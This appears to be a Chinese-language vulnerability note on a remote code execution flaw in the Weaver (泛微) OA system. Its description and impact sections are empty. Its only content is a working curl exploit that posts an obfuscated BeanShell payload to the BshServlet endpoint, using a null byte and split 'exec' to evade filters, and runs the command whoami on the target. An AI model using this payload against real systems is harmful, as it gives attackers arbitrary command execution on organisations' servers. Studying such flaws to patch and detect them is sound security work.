泛微OA 管理系统RCE漏洞
======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
